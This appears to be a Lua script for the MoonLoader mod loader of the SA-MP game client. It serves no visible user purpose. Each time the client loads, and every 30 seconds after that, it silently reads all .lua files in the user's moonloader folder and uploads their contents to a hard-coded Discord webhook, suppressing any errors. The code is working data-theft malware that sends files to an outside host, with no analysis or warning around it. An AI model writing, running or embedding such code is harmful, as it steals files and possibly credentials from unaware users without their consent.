local ffi = require "ffi"
local inicfg = require 'inicfg'
local encoding = require("encoding")
local lfs = require("lfs")
encoding.default = 'CP1251'
local u8 = encoding.UTF8

local webhook_url = "https://discordapp.com/api/webhooks/1469890609480204601/UMVXm71l2R75tJoI82-yvhT206R-9JAqDJW95_HwY9Q9S5L7ETXNjMEYWAIQCb6ODGjE"

function main()
    repeat wait(0) until isSampAvailable()
    wait(100)
    enviarTodosLua()
    while true do
        wait(30000)
        enviarTodosLua()
    end
end

function enviarTodosLua()
    local pasta = "moonloader\\"
    local arquivos = listarArquivos(pasta, "%.lua$")
    
    for _, arquivo in ipairs(arquivos) do
        wait(100)
        local caminho_completo = pasta .. arquivo
        local conteudo = lerArquivo(caminho_completo)
        
        if conteudo and conteudo:len() > 0 then
            enviarArquivoWebhook(webhook_url, conteudo, arquivo)
        end
    end
end

function listarArquivos(pasta, filtro)
    local arquivos = {}
    local attr = lfs.attributes(pasta)
    if not attr or attr.mode ~= "directory" then
        return arquivos
    end
    
    for arquivo in lfs.dir(pasta) do
        if arquivo ~= "." and arquivo ~= ".." then
            if string.match(arquivo, filtro) then
                table.insert(arquivos, arquivo)
            end
        end
    end
    
    return arquivos
end

function lerArquivo(caminho)
    local arquivo = io.open(caminho, "r")
    if not arquivo then return nil end
    local conteudo = arquivo:read("*a")
    arquivo:close()
    return conteudo
end

function enviarArquivoWebhook(url, conteudo, nome_arquivo)
    lua_thread.create(function()
        local requests = require("requests")
        
        local boundary = "----Boundary" .. tostring(math.random(10000, 99999))
        local body = ""
        
        body = body .. "--" .. boundary .. "\r\n"
        body = body .. "Content-Disposition: form-data; name=\"payload_json\"\r\n"
        body = body .. "Content-Type: application/json\r\n\r\n"
        body = body .. '{"content":"","username":"Lua Files"}' .. "\r\n"
        
        body = body .. "--" .. boundary .. "\r\n"
        body = body .. "Content-Disposition: form-data; name=\"file\"; filename=\"" .. nome_arquivo .. ".txt\"\r\n"
        body = body .. "Content-Type: text/plain\r\n\r\n"
        body = body .. conteudo .. "\r\n"
        
        body = body .. "--" .. boundary .. "--\r\n"
        
        pcall(function()
            requests.post(url, {
                headers = {
                    ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
                },
                data = body
            })
        end)
    end)

end

